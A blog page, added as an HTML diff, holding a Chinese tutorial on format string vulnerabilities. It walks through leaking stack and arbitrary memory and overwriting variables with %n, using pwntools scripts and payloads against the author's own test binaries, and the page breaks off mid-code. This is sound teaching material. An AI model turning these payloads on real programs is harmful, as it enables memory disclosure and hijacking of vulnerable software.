@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        格式化字符串漏洞初识 - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理和介绍"><span class="toc-text">原理和介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#函数介绍"><span class="toc-text">函数介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#格式化字符串函数"><span class="toc-text">格式化字符串函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#格式化字符串的格式"><span class="toc-text">格式化字符串的格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#格式化字符串漏洞原理"><span class="toc-text">格式化字符串漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序崩溃"><span class="toc-text">程序崩溃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露内存"><span class="toc-text">泄露内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#泄露栈内存"><span class="toc-text">泄露栈内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取变量字符串"><span class="toc-text">获取变量字符串</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露任意地址内存"><span class="toc-text">泄露任意地址内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖内存"><span class="toc-text">覆盖内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#覆盖栈内存"><span class="toc-text">覆盖栈内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#覆盖小数字"><span class="toc-text">覆盖小数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#覆盖大数字"><span class="toc-text">覆盖大数字</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        格式化字符串漏洞初识
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-02-28 22:01:24</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>两天！</p>
+<a id="more"></a>
+
+<h2 id="原理和介绍"><a href="#原理和介绍" class="headerlink" title="原理和介绍"></a>原理和介绍</h2><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><p>格式化字符串函数是将计算机内存中表示的数据转化为我们人类可读的字符串格式。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
+<ol>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数，可选</li>
+</ol>
+<p>例如：printf函数<br><img src="https://s2.ax1x.com/2019/02/28/kHi7If.jpg" alt></p>
+<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><ul>
+<li>输入</li>
+<li><ul>
+<li>scanf</li>
+</ul>
+</li>
+<li>输出 </li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th align="center">基本介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>printf</td>
+<td align="center">输出到stdout</td>
+</tr>
+<tr>
+<td>fprintf</td>
+<td align="center">输出到指定的FILE流</td>
+</tr>
+<tr>
+<td>vprintf</td>
+<td align="center">根据参数列表格式化输出到stdout</td>
+</tr>
+<tr>
+<td>vfprintf</td>
+<td align="center">根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td align="center">输出到字符串</td>
+</tr>
+<tr>
+<td>snprintf</td>
+<td align="center">输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td>vsprintf</td>
+<td align="center">根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td>vsnprintf</td>
+<td align="center">根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>……</td>
+<td align="center">…….</td>
+</tr>
+</tbody></table>
+<h3 id="格式化字符串的格式"><a href="#格式化字符串的格式" class="headerlink" title="格式化字符串的格式"></a>格式化字符串的格式</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[<span class="string">parameter</span>][<span class="symbol">flags</span>][<span class="string">field width</span>][<span class="symbol">.precision</span>][<span class="string">length</span>]type</span><br></pre></td></tr></table></figure>
+
+<p>每一个参数具体看<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">格式化字符串</a> </p>
+<ul>
+<li>field width</li>
+<li><ul>
+<li>输出的最小宽度</li>
+</ul>
+</li>
+<li>precision</li>
+<li><ul>
+<li>输出的最大长度</li>
+</ul>
+</li>
+<li>length</li>
+<li><ul>
+<li>hh：输出一个字节</li>
+</ul>
+</li>
+<li><ul>
+<li>h：输出一个双字节</li>
+</ul>
+</li>
+<li>type</li>
+<li><ul>
+<li>d/i：有符号整数</li>
+</ul>
+</li>
+<li><ul>
+<li>u：无符号整数</li>
+</ul>
+</li>
+<li><ul>
+<li>x/X：16进制，x使用小写字母，X使用大写字母</li>
+</ul>
+</li>
+<li><ul>
+<li>o：8进制</li>
+</ul>
+</li>
+<li><ul>
+<li>s：输出null结尾的字符串</li>
+</ul>
+</li>
+<li><ul>
+<li>c：输出char类型</li>
+</ul>
+</li>
+<li><ul>
+<li>p：输出对应变量的值或者是地址</li>
+</ul>
+</li>
+<li><ul>
+<li>n：不输出字符，但是把已经输出的字符串个数写入对应的整型指针参数所指的变</li>
+</ul>
+</li>
+</ul>
+<h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>如果当程序写成：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">printf</span>(<span class="string">"Color %s, Number %d, Float %4.2f"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>没有其他的参数，只有一个格式化字符串的参数，那么程序会照样运行，会将栈上存储格式化字符串地址上面的三个变量分别按照格式进行解析。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>一般来说，如果一个程序存在格式化字符串，那么让这个程序崩溃的方法就很简单，我们只要输出若干个%s即可,原因是栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span><span class="symbol">%s</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><p>利用格式化字符串漏洞，一般会有这几种操作：</p>
+<ul>
+<li>泄露栈内存</li>
+<li><ul>
+<li>获取某个变量的值</li>
+</ul>
+</li>
+<li><ul>
+<li>获取某个变量对应地址的内存</li>
+</ul>
+</li>
+<li>泄露任意地址内存</li>
+<li><ul>
+<li>利用GOT表得到libc函数地址，进而获取libc，进而获取到libc中的其它函数的地址</li>
+</ul>
+</li>
+<li>– 盲打，dump整个程序，获取有用信息</li>
+</ul>
+<h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>把下面程序编译成32位的，</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-<span class="keyword">stack</span>-protector -<span class="keyword">no</span>-pie -o <span class="keyword">test</span> <span class="keyword">test</span>.c</span><br></pre></td></tr></table></figure>
+
+<p>运行该程序，并输入“%08x.%08x.%08x”</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  格式化字符串漏洞 ./test </span><br><span class="line"><span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span></span><br><span class="line"><span class="number">00000001.22222222</span>.<span class="number">0</span>ffffffff.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span></span><br><span class="line">ffe<span class="number">3</span>b<span class="number">120</span>.f<span class="number">7</span>f<span class="number">6</span><span class="keyword">c</span><span class="number">410.00000001</span></span><br></pre></td></tr></table></figure>
+
+<p>发现确实输出了一些内容，那么我们现在用GDB来调试一下，看看输出来的是什么，在printf下断点：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一个<span class="built_in">printf</span>的地址：<span class="number">0x080484BA</span></span><br><span class="line">第二个<span class="built_in">printf</span>的地址：<span class="number">0x080484C9</span></span><br></pre></td></tr></table></figure>
+
+<p>运行程序，停在了第一个printf处：<br><img src="https://s2.ax1x.com/2019/02/28/kHFEQJ.jpg" alt><br>可以看出来第一个参数在栈上的位置，继续运行程序：<br><img src="https://s2.ax1x.com/2019/02/28/kHFZLR.jpg" alt><br>第二个printf确实把字符串“%08x.%08x.%08x”当成格式化字符串解析，而参数直接是栈上的参数，造成了栈上的数据泄露。当然我们也可以使用%p来获取数据</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  格式化字符串漏洞 ./test</span><br><span class="line"><span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span></span><br><span class="line"><span class="number">00000001.22222222</span>.0ffffffff.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span></span><br><span class="line"><span class="number">0</span>xfff923d0.0xf7ed7410.0x1</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取变量字符串"><a href="#获取变量字符串" class="headerlink" title="获取变量字符串"></a>获取变量字符串</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">s</span></span></span><br><span class="line"><span class="tag">%<span class="selector-tag">n</span></span>$s</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>利用%x来获取对应栈的内存，建议使用%p，可以不用考虑位数的区别</p>
+<blockquote>
+<p>利用%s来获取变量所对应地址的内容，只不过有零截断</p>
+<blockquote>
+<p>利用%n$x来获取制定参数的值，利用%n$s来获取制定参数对应地址的内容</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>通过一个例子来具体说明怎么泄露任意地址内存的</p>
+<p>例子源代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将代码编译成32位的程序，编译的命令在上面有。然后载入到gdb中，在调用scanf前下断点，如图所示：<br><img src="https://s2.ax1x.com/2019/02/28/kHFme1.jpg" alt><br>我们在程序中输入：“AAAA%p%p%p%p%p”，我们输入的字符串被存到了栈上“0xffffd108”开头的位置<br><img src="https://s2.ax1x.com/2019/02/28/kHFndx.jpg" alt><br>接着运行该程序，根据程序的输出我们可以得知，当调用printf函数的时候，由于我们输入的字符串带有格式化形式，printf将我们输入的字符串当成format解析，但是我们没有向printf函数中传入其他的参数值，那么其他参数是默认依次从栈上获取的，看最后函数输出的结果与栈上的数据对比是一致的<br><img src="https://s2.ax1x.com/2019/02/28/kHFMFK.jpg" alt><br>从上面我们可以知道，我们输入的字符串在栈上与printf函数第一个参数的偏移是6，那么相对于函数来说是第七个参数，相对于格式化字符串来说是第六个参数，那么如果我们输入前四位是一个正确的地址的话，我们就可以用上面的%n$s来获取第六个参数也就是我们输出的前四位地址中的值</p>
+<p>那么我们来验证一下我们的猜想，动态调试一下</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">"./test"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./test"</span>)</span><br><span class="line">scanf_got = elf.got[<span class="string">'__isoc99_scanf'</span>]</span><br><span class="line">log.info(<span class="string">"scanf_got:"</span>+<span class="keyword">hex</span>(scanf_got))</span><br><span class="line">payload = p32(scanf_got)+<span class="string">"%6$s"</span></span><br><span class="line">gdb.attach(p,<span class="string">"b *0x804851b"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> <span class="keyword">hex</span>(u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>]))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/02/28/kHFQJO.jpg" alt><br>结合运行结果和调试时的值来看是对应着的，说明我们的猜想是对的<br><img src="https://s2.ax1x.com/2019/02/28/kHF8QH.jpg" alt><br>通过修改我们可以控制的地址，从而达到泄露任意地址内存</p>
+<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><p>覆盖内存需要用到的格式化字符串是“%n”</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">n</span></span>：不会打印任何东西，其参数必须是一个有符号整数的指针，它存储着它之前打印的所有字符数</span><br></pre></td></tr></table></figure>
+
+<p>一个简单的例子说明“%n”：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"hello %nhello\n"</span>, &amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,a );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出为：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  格式化字符串漏洞 gcc -m32 -fstack-protector -no-pie -o test2 test2.c</span><br><span class="line">➜  格式化字符串漏洞 ./test2</span><br><span class="line">hello hello</span><br><span class="line"><span class="number">6</span></span><br><span class="line">➜  格式化字符串漏洞</span><br></pre></td></tr></table></figure>
+
+<p>通过输出我们可以看出，在format中的%n前面有6个字符，并且参数是变量a的地址，然后打印变量a的值也为6。</p>
+<p>接下来再通过一个例子来解释格式化字符串漏洞具体利用过程，为了方便，我直接把将要覆盖的变量地址打印出来，源程序如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">789</span>;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,&amp;a);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="keyword">if</span>(a==<span class="number">123</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"success!\n"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"fail!\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成32位可执行程序。目前我们已经知道要覆盖的地址，那么我们现在来确定我们输出的字符串相对于printf函数的偏移量，gdb调试：<br><img src="https://s2.ax1x.com/2019/02/28/kHFGyd.jpg" alt><br>从上图可以得知偏移量为7,这个偏移量是相对于printf函数的，那么相对于格式化字符串的偏移量就是6，构造payload：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(c_addr)+<span class="string">"%119d%6$n"</span></span><br></pre></td></tr></table></figure>
+
+<p>然后进行脚本测试：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">from libformatstr <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">"./test"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./test"</span>)</span><br><span class="line">c_addr = eval(p.recv())</span><br><span class="line">gdb.<span class="built_in">attach</span>(p,<span class="string">"b *0x8048568"</span>)</span><br><span class="line">payload = p32(c_addr)+<span class="string">"%119d%6$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/02/28/kHFNwt.jpg" alt><br>通过结果证实了上面的过程</p>
+<h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>刚刚我们需要覆盖成的数字是123，是大于4的，现在把源程序中if条件改成“a==2”，如果按照刚刚payload的写法肯定是不能覆盖的，这个程序是32位的，地址是4位，地址在前面最少是要占4位，也就是说如果按照这个payload的写法写的话，覆盖成的数字最小是4。换个思路</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"aa%i$naa"</span>+p32(<span class="name">c_addr</span>)</span><br></pre></td></tr></table></figure>
+
+<p>形如上面的形式，在“%i$n”前面补两个a是为了覆盖a原来的值，后面补两个a是为了进行补齐，然后接上变量C的地址，那么现在相对于格式化字符串的第六个参数是“aa%i”,第七个参数是“$naa”,第八个参数就是C的地址。最后攻击脚本：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">from libformatstr <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">"./test"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./test"</span>)</span><br><span class="line">c_addr = eval(p.recv())</span><br><span class="line"><span class="meta">#gdb.attach(p,<span class="meta-string">"b *0x8048568"</span>)</span></span><br><span class="line">payload = <span class="string">"aa%8$naa"</span>+p32(c_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/02/28/kHFUTP.jpg" alt><br>发现这种方法是可行的。</p>
+<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>将if中“a==2”改为“a==0x12345678”。起初我仍然是按照刚刚构造payload的方法来进行payload的构造的</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =  p32(<span class="name">c_addr</span>)+<span class="string">"a"</span>*14+<span class="string">"%6$n"</span>+<span class="string">"aa"</span>+p32(<span class="name">a</span>)+<span class="string">"a"</span>*28+<span class="string">"%10$n"</span>+p32(<span class="name">b</span>)+<span class="string">"a"</span>*29+<span class="string">"%18$n"</span>+<span class="string">"aa"</span>+p32(<span class="name">c</span>)+<span class="string">"a"</span>*27+<span class="string">"%27$n"</span></span><br></pre></td></tr></table></figure>
+
+<p>但是没能实现覆盖，可能是因为太长了吧。之后我利用了CTF-WIKI上提供的函数来试了一遍，确实可以覆盖，自动生成payload函数如下：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def fmt(prev, <span class="built_in">word</span>, index):</span><br><span class="line">    <span class="keyword">if</span> prev &lt; <span class="built_in">word</span>:</span><br><span class="line">        <span class="literal">result</span> = <span class="built_in">word</span> - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(<span class="literal">result</span>) + <span class="string">"c"</span></span><br><span class="line">    elif prev == <span class="built_in">word</span>:</span><br><span class="line">        <span class="literal">result</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="literal">result</span> = <span class="number">256</span> + <span class="built_in">word</span> - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(<span class="literal">result</span>) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + str(index) + <span class="string">"$hhn"</span></span><br><span class="line"><span class="built_in">    return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fmt_str(<span class="built_in">offset</span>, size, addr, target):</span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span 